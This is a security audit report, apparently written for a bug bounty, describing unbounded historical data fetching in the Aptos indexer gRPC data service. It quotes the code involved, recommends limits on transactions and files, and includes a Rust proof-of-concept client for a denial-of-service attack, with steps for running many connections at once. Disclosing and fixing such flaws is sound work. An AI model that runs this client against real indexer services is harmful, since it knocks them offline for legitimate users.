# Audit Report

## Title
Unbounded Historical Data Fetching Enables DoS in Indexer gRPC Data Service

## Summary
The HistoricalDataService in the indexer-grpc-data-service-v2 component lacks limits on the total number of transactions that can be requested in a single streaming request. An attacker can request historical data starting from version 0 with no ending constraint, forcing the service to process potentially billions of transactions across thousands of files, causing resource exhaustion and denial of service.

## Finding Description

The vulnerability exists in how the HistoricalDataService handles requests without a `transactions_count` parameter. When a client sends a `GetTransactionsRequest` with:
- `starting_version: Some(0)` (or any old version)
- `transactions_count: None`

The service processes this request as follows: [1](#0-0) 

When `transactions_count` is None, `ending_version` becomes None, which is then converted to `u64::MAX`: [2](#0-1) 

The service then spawns a file reading task with **no file limit**: [3](#0-2) 

The `max_files: None` parameter means the file store reader will attempt to read ALL available transaction files. In the file store reader implementation: [4](#0-3) 

Without a `max_files` limit, `end_file_index` equals the total number of files in the batch, and the loop processes all files sequentially: [5](#0-4) 

Each file can contain up to 50 MB of transaction data. For a blockchain with billions of transactions, this means processing thousands or millions of files continuously until the only termination condition is met - reaching transactions within 60 seconds of current time: [6](#0-5) 

This breaks the **Resource Limits** invariant which states "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program criteria:
- **"API crashes"**: Multiple concurrent unbounded requests can overwhelm the indexer service, causing it to become unresponsive or crash
- **"Validator node slowdowns"**: If the indexer service shares infrastructure with validator nodes, the excessive I/O and CPU consumption can impact validator performance

An attacker can:
1. Open multiple concurrent streaming connections
2. Request starting_version: 0 with no transactions_count on each connection
3. Force the service to simultaneously process terabytes of historical data
4. Consume all available CPU, I/O bandwidth, and network resources
5. Prevent legitimate users from accessing the indexer API

## Likelihood Explanation

**Likelihood: Very High**

The attack requires:
- No authentication or special privileges
- A single gRPC request with specific parameters
- No complex setup or coordination

Any external client can send malicious requests to the publicly exposed indexer gRPC endpoint. The attack is trivial to execute and can be automated. With multiple concurrent connections, an attacker can sustain a denial of service condition indefinitely.

## Recommendation

Implement a maximum transaction count limit for streaming requests. Add a configuration parameter for the maximum allowed transactions per request and enforce it:

```rust
// In historical_data_service.rs, add constant:
const MAX_TRANSACTIONS_PER_REQUEST: u64 = 10_000_000; // 10 million

// In the request handling code (around line 108-110):
let ending_version = request
    .transactions_count
    .map(|count| {
        let requested_end = starting_version.saturating_add(count);
        let max_end = starting_version.saturating_add(MAX_TRANSACTIONS_PER_REQUEST);
        requested_end.min(max_end)
    })
    .unwrap_or_else(|| starting_version.saturating_add(MAX_TRANSACTIONS_PER_REQUEST));
```

Additionally, enforce a maximum number of files per batch in the file store reader call:

```rust
// In historical_data_service.rs (around line 174):
file_store_reader
    .get_transaction_batch(
        next_version,
        /*retries=*/ 3,
        /*max_files=*/ Some(1000), // Add reasonable limit
        filter,
        Some(ending_version),
        tx,
    )
    .await;
```

## Proof of Concept

```rust
// PoC: Malicious client that triggers unbounded fetching
use aptos_protos::indexer::v1::{
    data_service_client::DataServiceClient, GetTransactionsRequest,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to the indexer gRPC service
    let mut client = DataServiceClient::connect("http://indexer-service:50051").await?;
    
    // Craft malicious request with unbounded range
    let request = Request::new(GetTransactionsRequest {
        starting_version: Some(0), // Request from genesis
        transactions_count: None,   // No limit - will default to u64::MAX
        batch_size: None,           // Use default batch size
        transaction_filter: None,
    });
    
    // Send request - this will cause the service to attempt processing
    // billions of transactions from version 0 to near-current
    let mut response_stream = client.get_transactions(request).await?.into_inner();
    
    // Keep connection alive while service processes massive dataset
    while let Some(_response) = response_stream.message().await? {
        // Service continues processing files...
        // Multiple concurrent connections amplify the DoS
    }
    
    Ok(())
}
```

**Validation Steps:**
1. Deploy indexer-grpc-data-service-v2 with HistoricalDataService enabled
2. Run the PoC client against the service
3. Monitor service metrics - observe continuous file processing and resource consumption
4. Launch multiple concurrent PoC clients
5. Observe service degradation and potential crash due to resource exhaustion

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L108-110)
```rust
                let ending_version = request
                    .transactions_count
                    .map(|count| starting_version + count);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L149-149)
```rust
        let ending_version = ending_version.unwrap_or(u64::MAX);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L169-180)
```rust
            tokio::spawn(async move {
                file_store_reader
                    .get_transaction_batch(
                        next_version,
                        /*retries=*/ 3,
                        /*max_files=*/ None,
                        filter,
                        Some(ending_version),
                        tx,
                    )
                    .await;
            });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L264-273)
```rust
            if close_to_latest {
                info!(
                    stream_id = id,
                    "Stream is approaching to the latest transactions, terminate."
                );
                COUNTER
                    .with_label_values(&["terminate_close_to_latest"])
                    .inc();
                break;
            }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/file_store_operator_v2/file_store_reader.rs (L110-113)
```rust
        let mut end_file_index = batch_metadata.files.len();
        if let Some(max_files) = max_files {
            end_file_index = end_file_index.min(file_index.saturating_add(max_files));
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/file_store_operator_v2/file_store_reader.rs (L115-121)
```rust
        for i in file_index..end_file_index {
            let current_version = batch_metadata.files[i].first_version;
            if let Some(ending_version) = ending_version {
                if current_version >= ending_version {
                    break;
                }
            }
```
